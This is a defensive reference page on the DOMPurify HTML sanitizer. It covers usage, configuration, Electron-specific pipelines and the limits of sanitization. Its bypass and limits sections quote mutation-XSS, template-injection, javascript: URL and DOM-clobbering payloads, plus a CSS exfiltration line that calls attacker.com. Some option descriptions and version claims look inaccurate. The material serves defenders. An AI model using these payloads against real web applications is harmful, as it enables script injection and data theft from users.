---
title: DOMPurify
description: DOMPurify as an XSS sanitizer — correct usage, bypass history, and effectiveness limits
---

# DOMPurify

DOMPurify is the standard HTML sanitization library for JavaScript environments. It parses HTML using the browser's own DOM parser, then walks the resulting tree removing dangerous elements and attributes.

---

## Basic Usage

```javascript
import DOMPurify from 'dompurify';

// ✅ Sanitize before innerHTML:
const dirty = userInput;                          // SOURCE
const clean = DOMPurify.sanitize(dirty);          // SANITIZER
element.innerHTML = clean;                        // SINK (now safe for XSS)

// ✅ Strict: only allow text (no HTML at all):
const cleanText = DOMPurify.sanitize(dirty, { ALLOWED_TAGS: [] });
element.textContent = cleanText;  // Even safer

// ✅ Allow specific tags only:
const cleanBlog = DOMPurify.sanitize(dirty, {
  ALLOWED_TAGS: ['p', 'b', 'i', 'em', 'strong', 'a', 'ul', 'ol', 'li', 'br'],
  ALLOWED_ATTR: ['href', 'title'],
  ALLOW_DATA_ATTR: false,  // Block data-* attributes
});
```

---

## DOMPurify Configuration Options

```javascript
DOMPurify.sanitize(input, {
  // Tag allowlist (default: extensive list):
  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a'],
  
  // Attribute allowlist:
  ALLOWED_ATTR: ['href', 'class', 'id'],
  
  // Block entire tag categories:
  FORBID_TAGS: ['style', 'svg', 'math'],
  FORBID_ATTR: ['style', 'onerror', 'onclick'],
  
  // Force all URLs to be safe:
  FORCE_BODY: true,
  
  // Return DOM node instead of string:
  RETURN_DOM: false,
  RETURN_DOM_FRAGMENT: false,
  
  // Namespace for SVG/MathML:
  NAMESPACE: 'http://www.w3.org/1999/xhtml',
  
  // Allow data attributes:
  ALLOW_DATA_ATTR: false,  // Block data-* (can be used as XSS vectors in some frameworks)
  
  // Custom hook:
  // (see hooks section below)
});
```

---

## Historical Bypasses

DOMPurify has had numerous bypasses — staying updated is critical:

### mXSS (Mutation XSS) Bypass

The core attack vector for DOMPurify bypasses: HTML that looks safe when parsed in one context but becomes unsafe when moved to another context (mutation).

```javascript
// Classic mXSS payload (pre-2.x):
// Input: <math><mtext></math><img src=1 onerror=alert(1)>
// DOMPurify parses in <body> context: <math><mtext> + closing tag mutation
// Results in: <img src=1 onerror=alert(1)> after DOM moves it

// Another mXSS example (HTML namespace confusion):
// <svg><p><style><img src=1 onerror=alert(1)></style></p></svg>
// In SVG namespace: <style> is a CDATA section, onerror= is text
// DOMPurify sees no script, allows it
// When moved to HTML namespace: <style> terminates early, onerror= is an attribute → XSS
```

### Template Literal Bypass (pre-3.0)

```javascript
// DOMPurify < 3.0 with SAFE_FOR_TEMPLATES option:
DOMPurify.sanitize(input, { SAFE_FOR_TEMPLATES: true });
// Input: {{constructor.constructor('alert(1)')()}}
// DOMPurify removed {{ }} thinking it was template — but framework re-evaluated it
```

### DOM Clobbering

DOMPurify allows `id` and `name` attributes by default (up to a version):

```html
<!-- DOM clobbering payload: -->
<form id="config"><input name="isAdmin" value="true"></form>

<!-- Later JS reads: -->
window.config.isAdmin  → "<input name="isAdmin" value="true">" (HTMLElement, truthy)
```

---

## DOMPurify in Electron-Specific Context

### Node.js Environment Issues

DOMPurify needs a DOM to work — in Node.js (main process), you need to provide one:

```javascript
// ❌ Doesn't work in Node.js main process:
const DOMPurify = require('dompurify');
DOMPurify.sanitize(input);  // Error: DOMPurify requires a DOM

// ✅ Use jsdom for server-side sanitization:
const { JSDOM } = require('jsdom');
const { window } = new JSDOM('');
const DOMPurify = require('dompurify')(window);
const clean = DOMPurify.sanitize(input);

// ✅ Or sanitize in renderer (where DOM is available):
// preload.js:
const DOMPurify = require('dompurify');
contextBridge.exposeInMainWorld('api', {
  sanitize: (html) => DOMPurify.sanitize(html)
});
```

### Markdown → HTML Pipeline

A common source of XSS in Electron apps:

```javascript
const marked = require('marked');
const DOMPurify = require('dompurify');

// ❌ XSS if marked output not sanitized:
const html = marked.parse(markdownInput);      // SOURCE → HTML with potential XSS
element.innerHTML = html;                       // SINK: XSS via markdown

// ✅ Sanitize after markdown rendering:
const html = marked.parse(markdownInput);       // SOURCE → HTML
const safe = DOMPurify.sanitize(html, {
  ALLOWED_TAGS: ['p', 'h1', 'h2', 'h3', 'code', 'pre', 'ul', 'ol', 'li',
                  'blockquote', 'strong', 'em', 'a', 'img', 'hr', 'br'],
  ALLOWED_ATTR: ['href', 'src', 'alt', 'class', 'id', 'title'],
});
element.innerHTML = safe;                       // Sanitized

// But: <img src="x" onerror=...> — src is allowed, onerror is blocked by DOMPurify
// Consider: also filter src attributes for safe protocols:
DOMPurify.addHook('afterSanitizeAttributes', (node) => {
  if (node.hasAttribute('src')) {
    const src = node.getAttribute('src');
    if (!src.startsWith('https://') && !src.startsWith('data:image/')) {
      node.removeAttribute('src');
    }
  }
});
```

---

## When DOMPurify is Not Enough

DOMPurify sanitizes **HTML** — it doesn't help with:

```javascript
// URL-based XSS — DOMPurify allows href, attacker uses javascript::
const cleanHtml = DOMPurify.sanitize('<a href="javascript:alert(1)">click</a>');
// Result: <a href="javascript:alert(1)">click</a>  ← DOMPurify 2.x allows this!
// DOMPurify 3.x blocks javascript: by default

// Template injection — if rendered by a template engine after sanitization:
const template = DOMPurify.sanitize('{{constructor.constructor("alert(1)")()}}');
// DOMPurify returns the text as-is — not HTML XSS
// But Angular/Vue/Handlebars will evaluate {{ }} → XSS

// CSS injection — style attributes:
DOMPurify.sanitize('<span style="background:url(javascript:alert(1))">');
// DOMPurify blocks url(javascript:...) in most cases but CSS injection can still
// lead to data exfiltration via background-image: url('https://attacker.com/' + secretText)
```

---

## Keeping DOMPurify Updated

```bash
# Check current version:
cat node_modules/dompurify/package.json | grep '"version"'

# Update to latest:
npm update dompurify

# Check for known vulnerabilities:
npm audit

# Run Electronegativity check for missing sanitization:
electronegativity -i . | grep -i "sanitiz\|purify\|innerHTML"
```

---

## DOMPurify as Taint Chain Breaker

| Input Type | DOMPurify Effectiveness |
|-----------|------------------------|
| HTML with `<script>` tags | ✅ Blocks |
| `<img onerror=...>` | ✅ Blocks |
| `<svg onload=...>` | ✅ Blocks |
| `javascript:` href | ✅ Blocks (DOMPurify 3.x) / ⚠️ Partial (2.x) |
| mXSS via namespace confusion | ✅ Fixed in current versions |
| DOM clobbering via `id`/`name` | ⚠️ Partial (enable `SANITIZE_DOM` option) |
| Template injection `{{}}` | ❌ Not HTML, not DOMPurify's scope |
| CSS-based data exfiltration | ⚠️ Partial |
| Binary/non-HTML content | ❌ Not applicable |
